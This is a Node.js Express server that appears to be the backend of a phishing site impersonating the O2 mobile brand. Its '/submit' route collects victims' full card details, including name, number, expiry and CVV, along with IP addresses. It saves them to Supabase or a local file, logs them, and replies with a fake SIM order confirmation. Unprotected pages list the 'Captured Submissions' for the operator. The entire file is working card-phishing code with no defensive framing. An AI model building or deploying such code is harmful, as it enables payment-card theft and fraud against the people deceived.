const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const os = require('os');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;
const SUPABASE_URL = process.env.SUPABASE_URL?.trim();
const SUPABASE_KEY = process.env.SUPABASE_KEY?.trim();
const MONGODB_URI = process.env.MONGODB_URI?.trim();
const supabase = SUPABASE_URL && SUPABASE_KEY ? createClient(SUPABASE_URL, SUPABASE_KEY) : null;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

const FALLBACK_FILE = path.join(__dirname, 'submissions.json');

function readFallbackSubmissions() {
  try {
    if (!fs.existsSync(FALLBACK_FILE)) return [];
    const raw = fs.readFileSync(FALLBACK_FILE, 'utf8');
    return JSON.parse(raw || '[]');
  } catch (e) {
    console.error('Error reading fallback submissions:', e.message);
    return [];
  }
}

function appendFallbackSubmission(submission) {
  try {
    const items = readFallbackSubmissions();
    items.unshift(submission);
    fs.writeFileSync(FALLBACK_FILE, JSON.stringify(items, null, 2));
    return true;
  } catch (e) {
    console.error('Error writing fallback submission:', e.message);
    return false;
  }
}

// Configure Supabase
if (supabase) {
  console.log('✅ Supabase client configured');
} else {
  console.warn('⚠️  No Supabase configuration found. Submissions will use fallback storage only.');
}

async function fetchSupabaseSubmissions() {
  if (!supabase) return [];
  const { data, error } = await supabase
    .from('submissions')
    .select('*')
    .order('timestamp', { ascending: false });
  if (error) {
    console.error('Error fetching submissions from Supabase:', error.message || error);
    return [];
  }
  // Transform snake_case columns back to camelCase
  return (data || []).map(row => ({
    id: row.id,
    timestamp: row.timestamp,
    nameOnCard: row.name_on_card,
    cardNumber: row.card_number,
    expiry: row.expiry,
    cvv: row.cvv,
    ip: row.ip,
    userAgent: row.user_agent,
    createdAt: row.created_at,
  }));
}

async function fetchSubmissions() {
  if (!supabase) return readFallbackSubmissions();
  const submissions = await fetchSupabaseSubmissions();
  if (submissions.length) return submissions;
  return readFallbackSubmissions();
}

// POST /submit — save card details to Supabase
app.post('/submit', async (req, res) => {
  const { nameOnCard, cardNumber, expiry, cvv } = req.body;

  if (!nameOnCard || !cardNumber || !expiry || !cvv) {
    return res.status(400).json({ success: false, error: 'All fields are required.' });
  }

  try {
    const submission = {
      timestamp: new Date().toISOString(),
      nameOnCard,
      cardNumber,
      expiry,
      cvv,
      ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
      userAgent: req.headers['user-agent'],
      createdAt: new Date().toISOString(),
    };

    // Format for Supabase (snake_case columns)
    const supabasePayload = {
      timestamp: submission.timestamp,
      name_on_card: nameOnCard,
      card_number: cardNumber,
      expiry,
      cvv,
      ip: submission.ip,
      user_agent: submission.userAgent,
      created_at: submission.createdAt,
    };

    let savedToDb = false;
    try {
      if (!supabase) throw new Error('Supabase client not configured');
      const { data, error } = await supabase
        .from('submissions')
        .insert([supabasePayload]);
      if (error) {
        console.error('Supabase insert error details:', error);
        throw error;
      }
      savedToDb = true;
      console.log('✅ Saved to Supabase');
    } catch (dbErr) {
      console.error('⚠️  Supabase save failed:', dbErr.message || dbErr);
      appendFallbackSubmission({ id: Date.now(), ...submission });
    }

    console.log('\n========== NEW SUBMISSION ==========');
    console.log('Time:        ', submission.timestamp);
    console.log('Name:        ', submission.nameOnCard);
    console.log('Card Number: ', submission.cardNumber);
    console.log('Expiry:      ', submission.expiry);
    console.log('CVV:         ', submission.cvv);
    console.log('IP:          ', submission.ip);
    console.log('=====================================\n');

    if (savedToDb) {
      res.json({ success: true, message: 'Order placed! Your SIM is on its way.' });
    } else {
      res.json({ success: true, message: 'Order placed.' });
    }
  } catch (error) {
    console.error('Submission error:', error);
    // Try fallback on unexpected errors
    try {
      appendFallbackSubmission({ id: Date.now(), timestamp: new Date().toISOString(), nameOnCard, cardNumber, expiry, cvv, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, userAgent: req.headers['user-agent'] });
      return res.json({ success: true, message: 'Order placed.' });
    } catch (e) {
      return res.status(500).json({ success: false, error: 'Failed to process submission.' });
    }
  }
});

// GET /api/submissions — view all captured data (JSON)
app.get('/api/submissions', async (req, res) => {
  try {
    const submissions = await fetchSubmissions();
    res.json(submissions);
  } catch (error) {
    console.error('Error fetching submissions:', error);
    const fallback = readFallbackSubmissions();
    return res.json(fallback);
  }
});

// GET /submissions — view submissions page (HTML)
app.get('/submissions', async (req, res) => {
  try {
    const submissions = await fetchSubmissions();
    res.send(getSubmissionsPage(submissions));
  } catch (error) {
    console.error('Error fetching submissions:', error);
    const fallback = readFallbackSubmissions();
    res.send(getSubmissionsPage(fallback));
  }
});

// GET / — serve main form page (index.html)
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

function getSubmissionsPage(submissions) {
  const rows = submissions.map(s => `
    <tr>
      <td>${new Date(s.timestamp).toLocaleString()}</td>
      <td>${s.nameOnCard || '—'}</td>
      <td>${s.cardNumber || '—'}</td>
      <td>${s.expiry || '—'}</td>
      <td>${s.cvv || '—'}</td>
      <td>${s.ip || '—'}</td>
    </tr>
  `).join('');

  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Submissions – O2</title>
      <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
      <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Inter', sans-serif; background: #f4f4f6; color: #1a1a2e; padding: 20px; }
        nav { background: #0019a5; padding: 0 24px; display: flex; align-items: center; height: 64px; margin-bottom: 40px; border-radius: 8px; }
        .nav-logo { color: #fff; font-size: 24px; font-weight: 800; }
        .container { max-width: 1100px; margin: 0 auto; background: #fff; border-radius: 12px; padding: 32px; box-shadow: 0 4px 24px rgba(0,25,165,0.08); }
        h1 { font-size: 28px; font-weight: 700; color: #0019a5; margin-bottom: 24px; }
        .count { font-size: 14px; color: #666; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f4f4f6; padding: 12px 16px; text-align: left; font-size: 13px; font-weight: 600; color: #333; border-bottom: 2px solid #e0e0e8; }
        td { padding: 12px 16px; border-bottom: 1px solid #e0e0e8; font-size: 14px; }
        tr:hover { background: #fafafa; }
        .empty { text-align: center; padding: 40px 20px; color: #999; }
      </style>
    </head>
    <body>
      <nav>
        <div class="nav-logo">O<span style="font-size: 12px; vertical-align: super;">2</span> Submissions</div>
      </nav>
      <div class="container">
        <h1>📋 Captured Submissions</h1>
        <div class="count">${submissions.length} submission${submissions.length !== 1 ? 's' : ''}</div>
        ${submissions.length === 0 ? '<div class="empty">No submissions yet.</div>' : `
          <table>
            <thead>
              <tr>
                <th>Timestamp</th>
                <th>Name</th>
                <th>Card</th>
                <th>Expiry</th>
                <th>CVV</th>
                <th>IP Address</th>
              </tr>
            </thead>
            <tbody>
              ${rows}
            </tbody>
          </table>
        `}
      </div>
    </body>
    </html>
  `;
}

app.listen(PORT, () => {
  console.log(`\n🚀 O2 SIM Server running at http://localhost:${PORT}`);
  console.log(`📋 View submissions at http://localhost:${PORT}/submissions`);
  console.log(`� JSON API at http://localhost:${PORT}/api/submissions`);
  console.log(`💾 Database: ${MONGODB_URI ? (MONGODB_URI.includes('localhost') ? 'Local MongoDB' : 'MongoDB Atlas') : 'Not configured'}\n`);
});
